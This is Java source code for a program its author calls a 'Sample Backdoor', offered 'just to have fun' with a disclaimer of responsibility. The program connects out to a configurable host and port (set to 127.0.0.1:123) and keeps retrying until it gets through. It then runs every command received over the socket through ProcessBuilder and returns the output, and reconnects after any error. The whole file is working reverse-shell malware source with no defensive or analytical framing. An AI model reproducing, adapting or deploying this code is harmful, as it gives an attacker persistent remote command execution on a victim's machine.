/*
 * Sample Backdoor! Sample Script ! 
 * Just to have fun, and im not responsible for ur shit.
 * Made with love, made with hob azzine :D
 */
package bidoor;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.util.Scanner;
/**
 *
 * @author Mohammed TABIT <nap.software@gmail.com>
 */
public class Bidoor {

    /**
     * @param args the command line arguments
     */
     private static Socket s;
    private static Scanner sc;
    private static PrintWriter pr;
    private static int L;
    private static ProcessBuilder   ps;
    private static BufferedReader in;
    private static String line;
    private static String shit;
    private static String execute(String received) throws IOException, InterruptedException
    {
        String spli[] = received.split(" ");
        L = spli.length;
    switch(L) {
         case 1: 
           try
            {
                ps=new ProcessBuilder(spli[0]);
                ps.redirectErrorStream(true);
   
                Process pr = ps.start();  
   
                in = new BufferedReader(new InputStreamReader(pr.getInputStream()));
                line = "";
                shit = "";
                while ((line = in.readLine()) != null) {
                    shit = shit + line;
                }
                shit = shit.toString();
                pr.waitFor();
   
                in.close();
         
            }
            catch(Exception errr)
            {
                return errr.toString();
            }
    
                     break;
            case 2: 
             try
            {
                ps=new ProcessBuilder(spli[0],spli[1]);
                ps.redirectErrorStream(true);
   
                Process pr = ps.start();  
   
                in = new BufferedReader(new InputStreamReader(pr.getInputStream()));
                line = "";
                shit = "";
                while ((line = in.readLine()) != null) {
                    shit = shit + line;
                }
                shit = shit.toString();
                pr.waitFor();
   
                in.close();
              
            }
            catch(Exception errr)
            {
                return errr.toString();
            }
                     break;
            case 3: 
              try
            {
                ps=new ProcessBuilder(spli[0],spli[1],spli[2]);
                ps.redirectErrorStream(true);
   
                Process pr = ps.start();  
   
                in = new BufferedReader(new InputStreamReader(pr.getInputStream()));
                line = "";
                shit = "";
                while ((line = in.readLine()) != null) {
                    shit = shit + line;
                }
                shit = shit.toString();
                pr.waitFor();
 
   
                in.close();
            
            }
            catch(Exception errr)
            {
                return errr.toString();
            }
                     break;
            case 4:
                try
            {
                ps=new ProcessBuilder(spli[0],spli[1],spli[2],spli[3]);
                ps.redirectErrorStream(true);
   
                Process pr = ps.start();  
   
                in = new BufferedReader(new InputStreamReader(pr.getInputStream()));
                line = "";
                shit = "";
                while ((line = in.readLine()) != null) {
                    shit = shit + line;
                }
                shit = shit.toString();
                pr.waitFor();
 
   
                in.close();
            
            }
            catch(Exception errr)
            {
                return errr.toString();
            }
                     break;
                 case 5: 
                      try
            {
                ps=new ProcessBuilder(spli[0],spli[1],spli[2],spli[3],spli[4]);
                ps.redirectErrorStream(true);
   
                Process pr = ps.start();  
   
                in = new BufferedReader(new InputStreamReader(pr.getInputStream()));
                line = "";
                shit = "";
                while ((line = in.readLine()) != null) {
                    shit = shit + line;
                }
                shit = shit.toString();
                pr.waitFor();
 
   
                in.close();
             
            }
            catch(Exception errr)
            {
                return errr.toString();
            }
                     break;
                 case 6:
                        try
            {
                ps=new ProcessBuilder(spli[0],spli[1],spli[2],spli[3],spli[4],spli[5]);
                ps.redirectErrorStream(true);
   
                Process pr = ps.start();  
   
                in = new BufferedReader(new InputStreamReader(pr.getInputStream()));
                line = "";
                shit = "";
                while ((line = in.readLine()) != null) {
                    shit = shit + line;
                }
                shit = shit.toString();
                pr.waitFor();
 
   
                in.close();
             
            }
            catch(Exception errr)
            {
                return errr.toString();
            }
                       
    
                 break;
             default: 
                    System.out.println("Too many arguements");
    }
      
                          return shit;
    
    
    }     
        
    
  
     
    
      
    

     
    private static String resolve(String host)
    {
        InetAddress ip;
        while(true)
        {
            try
            {
                ip = InetAddress.getByName(host);
                host = ip.getHostAddress().toString();
                return host;
            }
            catch(Exception err)
            {
                continue;
            }
        }
    }
    private static int connect(String ip,int port)
 
    {
        try
        {
            s = new Socket(ip,port);
            return 1;
        }
        catch(Exception err)
        {
            return 0;
          
            
        }
     
    }
    public static void main(String[] args) throws IOException {
        // main class
           System.out.println("hello its Bidoor");
	System.out.println("-----------------------------------------------------------");
	System.out.println("-----------------------------------------------------------");
            String host = "127.0.0.1";
        int port = 123;
        String ip;
        ip = resolve(host);
        int stat;
        do
        {
            stat=connect(ip,port);
        }while(stat!=1);
        System.gc();
        pr = new PrintWriter(s.getOutputStream(),true);
        sc = new Scanner(s.getInputStream());
        sc.useDelimiter("\0");
        String received;
        String stdout;
        while(true)
        {  
            try
            {
                received = sc.next();
                received = received.trim();
                received = received.replace("\0", "");
                if(received.contains("quit")==true)
                {
                    pr.println("quit");
                    sc.close();
                    s.close();
                    System.exit(0);
                }
                else
                {
                    stdout = execute(received);
                    pr.print(stdout + "\0");
                    pr.flush();
                }
            }
            catch(Exception err)
            {
                System.gc();
                do
                {
                    stat=connect(ip,port);
                }while(stat!=1);
                pr = new PrintWriter(s.getOutputStream(),true);
                sc = new Scanner(s.getInputStream());
                sc.useDelimiter("\0");
            }
     
        }
 


    }
    
}
